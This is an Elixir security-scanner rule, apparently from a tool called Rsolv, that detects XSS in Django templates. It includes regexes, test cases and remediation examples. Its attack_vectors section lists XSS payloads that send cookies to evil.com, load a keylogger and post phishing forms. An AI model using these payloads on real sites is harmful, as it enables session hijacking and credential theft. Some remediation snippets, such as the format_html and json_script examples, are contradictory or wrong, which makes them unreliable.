defmodule Rsolv.Security.Patterns.Django.TemplateXss do
  @moduledoc """
  Django Template XSS pattern for Django applications.

  This pattern detects Cross-Site Scripting (XSS) vulnerabilities in Django
  templates where user input is rendered without proper escaping, typically
  through the use of the |safe filter, {% autoescape off %} blocks, or
  mark_safe() function.

  ## Background

  Django templates escape HTML by default, providing built-in XSS protection.
  However, developers can bypass this protection using:
  - The |safe filter to mark content as safe for rendering
  - {% autoescape off %} blocks to disable escaping
  - mark_safe() function in views
  - format_html() with user input
  - |safeseq filter for sequences

  ## Vulnerability Details

  XSS vulnerabilities occur when:
  1. User input is marked as safe using |safe filter
  2. Autoescape is disabled in template blocks
  3. mark_safe() is used on user-controlled data
  4. format_html() is used incorrectly with user input
  5. Custom filters are marked with is_safe=True

  ## Examples

      # VULNERABLE - Direct safe filter on user input
      {{ user_comment|safe }}

      # VULNERABLE - Autoescape disabled
      {% autoescape off %}
          {{ user_content }}
      {% endautoescape %}

      # VULNERABLE - mark_safe on request data
      return mark_safe(request.GET.get('message'))

      # SAFE - Default escaping
      {{ user_comment }}

      # SAFE - Explicit escaping
      {{ user_comment|escape }}

      # SAFE - Sanitized then marked safe
      {{ bleach.clean(user_content)|safe }}
  """

  use Rsolv.Security.Patterns.PatternBase

  @impl true
  def pattern do
    %Rsolv.Security.Pattern{
      id: "django-template-xss",
      name: "Django Template XSS",
      description: "XSS vulnerabilities through unsafe Django template filters",
      type: :xss,
      severity: :high,
      languages: ["python", "html"],
      frameworks: ["django"],
      regex: [
        # |safe filter - but not after sanitization functions
        ~r/\{\{\s*(?!.*(?:bleach\.clean|sanitize|escape_html)).*?\|safe\s*\}\}/,

        # autoescape off
        ~r/\{\%\s*autoescape\s+off\s*\%\}/,

        # mark_safe with request data
        ~r/mark_safe\s*\(\s*request\./,

        # mark_safe with user_ prefixed variables
        ~r/mark_safe\s*\(\s*user_/,

        # |safeseq filter in both {{ }} and {% %} contexts
        ~r/\|safeseq\s*[\}\%]\}/,

        # format_html with user_input
        ~r/format_html\s*\(\s*[^,]+,\s*user_input/,

        # format_html with request data
        ~r/format_html\s*\([^)]*request\./,

        # |safe filter with common user variables - but not after sanitization
        ~r/\{\{\s*(?!.*(?:bleach\.clean|sanitize|escape_html))(?:comment|message|content|bio|description|text|html|input|data)\s*\|safe\s*\}\}/i,

        # mark_safe with common unsafe sources
        ~r/mark_safe\s*\(\s*(?:comment|message|content|bio|description|text|html|input|data)/i
      ],
      cwe_id: "CWE-79",
      owasp_category: "A03:2021",
      recommendation:
        "Avoid using |safe filter on user input. Use Django's built-in escaping. If HTML is needed, sanitize with bleach library.",
      test_cases: %{
        vulnerable: [
          "{{ user_comment|safe }}",
          "{% autoescape off %}{{ user_data }}{% endautoescape %}",
          "return mark_safe(request.GET.get('html'))"
        ],
        safe: [
          "{{ user_comment }}",
          "{{ user_comment|escape }}",
          "{{ bleach.clean(user_comment)|safe }}"
        ]
      }
    }
  end

  @impl true
  def vulnerability_metadata do
    %{
      description: """
      Cross-Site Scripting (XSS) is one of the most common web vulnerabilities that
      allows attackers to inject malicious scripts into web pages viewed by other users.
      In Django templates, XSS can occur when user-controlled data is rendered without
      proper escaping.

      Django provides automatic HTML escaping by default, but developers can bypass
      this protection through several mechanisms:

      1. **The |safe filter**: Marks content as safe, bypassing all escaping
      2. **{% autoescape off %}**: Disables escaping for entire template blocks
      3. **mark_safe()**: Python function that marks strings as safe for rendering
      4. **format_html()**: Can be misused to include unsafe user input
      5. **Custom filters with is_safe=True**: Custom template filters that bypass escaping

      When exploited, XSS allows attackers to:
      - Steal session cookies and hijack user sessions
      - Perform actions on behalf of the victim
      - Deface websites
      - Redirect users to malicious sites
      - Install keyloggers or other malware
      """,
      attack_vectors: """
      1. **Session Hijacking**: `<script>fetch('evil.com/steal?cookie='+document.cookie)</script>`
      2. **Keylogger Injection**: `<script src="https://evil.com/keylogger.js"></script>`
      3. **Phishing Forms**: `<form action="https://evil.com/phish" method="post">...</form>`
      4. **Defacement**: `<script>document.body.innerHTML='<h1>Hacked!</h1>'</script>`
      5. **Cryptocurrency Mining**: `<script src="https://coinhive.com/lib/coinhive.min.js"></script>`
      6. **Social Engineering**: `<script>alert('Your session expired. Enter password:')</script>`
      7. **DOM Manipulation**: `<img src=x onerror="document.querySelector('form').action='//evil.com'">`
      8. **Event Handler Injection**: `<div onmouseover="alert(document.cookie)">Hover me</div>`
      9. **CSS Injection**: `<style>body{display:none}</style><h1>Site Maintenance</h1>`
      10. **Meta Redirect**: `<meta http-equiv="refresh" content="0;url=http://evil.com">`
      """,
      business_impact: """
      - Account takeover leading to unauthorized access to user data
      - Financial losses from fraudulent transactions
      - Reputation damage and loss of customer trust
      - Legal liability under data protection regulations (GDPR, CCPA)
      - SEO penalties if site is flagged as malicious
      - Loss of PCI compliance for payment processing
      - Customer support costs from compromised accounts
      - Business disruption from defacement attacks
      - Competitive disadvantage if customer data is stolen
      - Insurance claims and increased premiums
      """,
      technical_impact: """
      - Execution of arbitrary JavaScript in user browsers
      - Session cookie theft and session hijacking
      - Credential harvesting through fake forms
      - Client-side data manipulation
      - Redirection to malicious websites
      - Installation of browser-based malware
      - Cross-origin data theft via CORS bypass
      - Local storage and IndexedDB access
      - Camera/microphone access through WebRTC
      - Browser history and bookmark theft
      """,
      likelihood:
        "High - Developers often use |safe filter for convenience without considering security implications",
      cve_examples: """
      CVE-2022-22818 (CVSS 6.1 MEDIUM) - Django {% debug %} Template Tag XSS
      - Affected Django 2.2 < 2.2.27, 3.2 < 3.2.12, 4.0 < 4.0.2
      - The {% debug %} tag didn't properly encode context variables
      - Could lead to XSS when DEBUG=True and untrusted data in context
      - Fixed by properly escaping all context variables

      CVE-2024-21520 (CVSS 6.1 MEDIUM) - Django REST Framework XSS
      - Affected djangorestframework before 3.15.2
      - XSS via break_long_headers template filter
      - Improper input sanitization before splitting and joining with <br> tags
      - Allowed script injection through header values

      CVE-2019-14235 (CVSS 6.1 MEDIUM) - Django Admin XSS
      - Affected Django 1.11.x, 2.1.x, 2.2.x
      - XSS via ModelAdmin.readonly_fields
      - @property decorators not properly escaped
      - Allowed script injection through model attributes

      CVE-2024-22199 (CVSS 9.8 CRITICAL) - Django Template Engine XSS
      - Django Template Engine defaults vulnerable to XSS
      - autoescape not enabled by default in some configurations
      - Allowed widespread XSS vulnerabilities
      - Fixed by defaulting autoescape to true

      CVE-2023-36053 (CVSS 6.1 MEDIUM) - Django URLValidator Bypass
      - Django < 3.2.20, < 4.1.10, < 4.2.3
      - URLValidator subject to potential bypass
      - Could lead to XSS through validated URLs
      - Fixed with improved URL validation
      """,
      compliance_standards: [
        "OWASP Top 10 2021 - A03: Injection",
        "CWE-79: Cross-site Scripting",
        "CWE-80: Improper Neutralization of Script-Related HTML Tags",
        "CWE-83: Improper Neutralization of Script in Attributes",
        "CWE-87: Improper Neutralization of Alternate XSS Syntax",
        "PCI DSS 6.5.7 - Cross-site scripting",
        "NIST SP 800-53 - SI-10 Information Input Validation",
        "ISO 27001 - A.14.2.5 Secure system engineering principles",
        "ASVS 4.0 - V5 Validation, Sanitization and Encoding"
      ],
      remediation_steps: """
      1. **Use Django's Default Escaping**:
         ```django
         <!-- NEVER DO THIS with user input -->
         {{ user_comment|safe }}

         <!-- SAFE - Automatic escaping -->
         {{ user_comment }}

         <!-- SAFE - Explicit escaping -->
         {{ user_comment|escape }}

         <!-- SAFE - Force escaping even in autoescape off -->
         {{ user_comment|force_escape }}
         ```

      2. **Avoid Disabling Autoescape**:
         ```django
         <!-- NEVER DO THIS with user content -->
         {% autoescape off %}
             {{ user_content }}
         {% endautoescape %}

         <!-- SAFE - Keep autoescape on (default) -->
         {{ user_content }}

         <!-- If you must disable, escape individual variables -->
         {% autoescape off %}
             {{ static_content }}
             {{ user_content|escape }}
         {% endautoescape %}
         ```

      3. **Careful Use of mark_safe()**:
         ```python
         # NEVER DO THIS
         from django.utils.safestring import mark_safe

         def show_message(request):
             message = request.GET.get('message')
             return mark_safe(message)  # VULNERABLE!

         # SAFE - Only mark safe after sanitization
         import bleach

         def show_message(request):
             message = request.GET.get('message', '')
             # Define allowed tags and attributes
             cleaned = bleach.clean(
                 message,
                 tags=['p', 'br', 'strong', 'em'],
                 attributes={},
                 strip=True
             )
             return mark_safe(cleaned)

         # SAFER - Avoid HTML entirely
         def show_message(request):
             message = request.GET.get('message', '')
             return message  # Let Django escape it
         ```

      4. **Secure format_html() Usage**:
         ```python
         from django.utils.html import format_html

         # NEVER DO THIS
         def greet_user(name):
             return format_html('<h1>{}</h1>', name)  # If name has HTML, it renders!

         # SAFE - format_html escapes placeholders
         def greet_user(name):
             return format_html('<h1>{}</h1>', name)  # Actually safe - format_html escapes {}

         # SAFE - Multiple placeholders
         def show_profile(name, bio):
             return format_html(
                 '<div class="profile"><h2>{}</h2><p>{}</p></div>',
                 name,  # Escaped
                 bio    # Escaped
             )

         # Be careful with format_html_join
         from django.utils.html import format_html_join

         items = [('item1', 'desc1'), ('item2', 'desc2')]
         result = format_html_join(
             '\n',
             '<li>{} - {}</li>',
             items  # Each item is escaped
         )
         ```

      5. **Sanitize Rich Text Content**:
         ```python
         # Install: pip install bleach
         import bleach

         # Define allowed HTML
         ALLOWED_TAGS = [
             'p', 'br', 'span', 'div', 'h1', 'h2', 'h3',
             'strong', 'em', 'u', 'a', 'ul', 'ol', 'li',
             'blockquote', 'code', 'pre'
         ]

         ALLOWED_ATTRIBUTES = {
             'a': ['href', 'title'],
             'span': ['class'],
             'div': ['class'],
             'code': ['class'],
         }

         def clean_html(html_content):
             return bleach.clean(
                 html_content,
                 tags=ALLOWED_TAGS,
                 attributes=ALLOWED_ATTRIBUTES,
                 strip=True,  # Strip disallowed tags
                 strip_comments=True
             )

         # In view
         def save_comment(request):
             comment = request.POST.get('comment', '')
             cleaned_comment = clean_html(comment)
             # Now safe to mark as safe
             Comment.objects.create(
                 content=cleaned_comment,
                 user=request.user
             )

         # In template
         {{ comment.content|safe }}  <!-- Now actually safe -->
         ```

      6. **Custom Template Filters**:
         ```python
         from django import template
         from django.utils.safestring import mark_safe
         import bleach

         register = template.Library()

         # NEVER DO THIS
         @register.filter(is_safe=True)  # Bypasses escaping!
         def format_user_content(value):
             return f'<div class="content">{value}</div>'

         # SAFE - Let Django handle escaping
         @register.filter
         def format_user_content(value):
             # Return normal string, Django will escape
             return f'User said: {value}'

         # SAFE - Sanitize if HTML needed
         @register.filter
         def sanitize_html(value):
             cleaned = bleach.clean(value, tags=['p', 'br'], strip=True)
             return mark_safe(cleaned)
         ```

      7. **Content Security Policy (CSP)**:
         ```python
         # settings.py
         CSP_DEFAULT_SRC = ("'self'",)
         CSP_SCRIPT_SRC = ("'self'", "'unsafe-inline'")  # Avoid unsafe-inline if possible
         CSP_STYLE_SRC = ("'self'", "'unsafe-inline'")

         # Or use Django-CSP middleware
         MIDDLEWARE = [
             # ...
             'csp.middleware.CSPMiddleware',
         ]
         ```
      """,
      prevention_tips: """
      - Always rely on Django's automatic HTML escaping
      - Never use |safe filter on user input without sanitization
      - Avoid {% autoescape off %} blocks with user content
      - Use bleach or similar library for rich text sanitization
      - Review all uses of mark_safe() during code reviews
      - Implement Content Security Policy (CSP) headers
      - Use Django's built-in template tags instead of raw HTML
      - Train developers on XSS risks and Django security features
      - Regular security audits focusing on template rendering
      - Use automated tools to scan for XSS vulnerabilities
      """,
      detection_methods: """
      - Search for |safe filter usage in templates
      - Grep for mark_safe() calls in Python code
      - Look for {% autoescape off %} blocks
      - Check custom template filters for is_safe=True
      - Use static analysis tools like Semgrep or Bandit
      - Dynamic testing with XSS payloads
      - Browser developer tools to check for unescaped content
      - Regular penetration testing
      - Code review checklist for template security
      """,
      safe_alternatives: """
      # 1. Default Django Escaping
      <!-- user_input = '<script>alert("XSS")</script>' -->
      {{ user_input }}
      <!-- Renders as: &lt;script&gt;alert("XSS")&lt;/script&gt; -->

      # 2. Explicit Escaping
      {{ user_input|escape }}
      {{ user_input|force_escape }}

      # 3. Conditional Escaping
      {% if user.is_trusted %}
          {{ content|safe }}
      {% else %}
          {{ content }}
      {% endif %}

      # 4. Rich Text with Bleach
      # views.py
      import bleach
      from django.conf import settings

      def sanitize_rich_text(html):
          return bleach.clean(
              html,
              tags=settings.ALLOWED_TAGS,
              attributes=settings.ALLOWED_ATTRS,
              protocols=['http', 'https', 'mailto'],
              strip=True
          )

      # 5. JSON Data in Templates
      <!-- UNSAFE -->
      <script>
          var data = {{ user_data|safe }};
      </script>

      <!-- SAFE - Use json_script filter -->
      {{ user_data|json_script:"user-data" }}
      <script>
          var data = JSON.parse(document.getElementById('user-data').textContent);
      </script>

      # 6. URL Construction
      <!-- UNSAFE -->
      <a href="{{ user_url|safe }}">Link</a>

      <!-- SAFE -->
      <a href="{{ user_url|urlencode }}">Link</a>

      # 7. CSS Classes
      <!-- UNSAFE -->
      <div class="{{ user_class|safe }}">

      <!-- SAFE - Whitelist approach -->
      {% if user_class in allowed_classes %}
          <div class="{{ user_class }}">
      {% else %}
          <div class="default">
      {% endif %}

      # 8. JavaScript String Escaping
      <!-- UNSAFE -->
      <script>
          var message = "{{ user_message|safe }}";
      </script>

      <!-- SAFE -->
      <script>
          var message = {{ user_message|escapejs|json_script }};
      </script>
      """
    }
  end

  @impl true
  def ast_enhancement do
    %{
      min_confidence: 0.8,
      context_rules: %{
        # Unsafe template filters
        unsafe_filters: [
          "safe",
          "safeseq",
          "mark_safe"
        ],

        # User input indicators
        user_variables: [
          "request",
          "user_input",
          "user_data",
          "comment",
          "message",
          "content",
          "description",
          "bio",
          "text"
        ],

        # Template control structures
        template_controls: [
          "autoescape",
          "filter",
          "load",
          "include"
        ],

        # Safe patterns to reduce false positives
        safe_patterns: [
          ~r/bleach\.clean/,
          ~r/escape_html/,
          ~r/sanitize/,
          ~r/strip_tags/,
          ~r/static\s+content/i
        ],

        # HTML sanitization libraries
        sanitizers: [
          "bleach",
          "html_sanitizer",
          "nh3",
          "sanitize_html"
        ]
      },
      confidence_rules: %{
        adjustments: %{
          # High confidence patterns
          safe_filter_with_user_input: +0.9,
          autoescape_off_block: +0.8,
          mark_safe_with_request: +0.9,
          format_html_with_user_data: +0.7,

          # Medium confidence
          safe_filter_generic: +0.5,
          custom_filter_is_safe: +0.6,

          # Lower confidence for safer patterns
          sanitized_before_safe: -0.8,
          static_content_safe: -0.9,
          admin_only_view: -0.6,

          # Context adjustments
          in_template_file: +0.2,
          in_view_function: +0.3,
          in_template_tag: +0.4,

          # File location adjustments
          in_test_file: -0.9,
          in_example_code: -0.8,
          commented_line: -1.0
        }
      },
      ast_rules: %{
        # Template analysis
        template_analysis: %{
          detect_unsafe_filters: true,
          check_filter_chains: true,
          analyze_autoescape_blocks: true,
          track_variable_sources: true
        },

        # Python code analysis
        python_analysis: %{
          detect_mark_safe_calls: true,
          check_format_html_usage: true,
          analyze_view_returns: true,
          track_request_data_flow: true
        },

        # Security analysis
        security_analysis: %{
          identify_sanitization: true,
          check_csp_headers: true,
          detect_safe_patterns: true,
          analyze_user_trust_levels: true
        },

        # Filter analysis
        filter_analysis: %{
          check_custom_filters: true,
          analyze_filter_decorators: true,
          detect_is_safe_flag: true,
          check_filter_logic: true
        }
      }
    }
  end

  def applies_to_file?(file_path, frameworks) do
    # Apply to Django template files and Python files
    is_template =
      String.ends_with?(file_path, ".html") ||
        String.ends_with?(file_path, ".htm") ||
        String.ends_with?(file_path, ".jinja") ||
        String.ends_with?(file_path, ".jinja2")

    is_python = String.ends_with?(file_path, ".py")

    # Django framework check
    frameworks_list = frameworks || []
    is_django = "django" in frameworks_list

    # Common Django file patterns
    is_django_file =
      String.contains?(file_path, "template") ||
        String.contains?(file_path, "views.py") ||
        String.contains?(file_path, "templatetags/")

    # Not a test file
    not_test =
      !String.contains?(file_path, "test") &&
        !String.contains?(file_path, "spec")

    # If no frameworks specified but it looks like Django, include it
    inferred_django = frameworks_list == [] && is_django_file

    (is_template || is_python) && (is_django || inferred_django) && not_test
  end
end
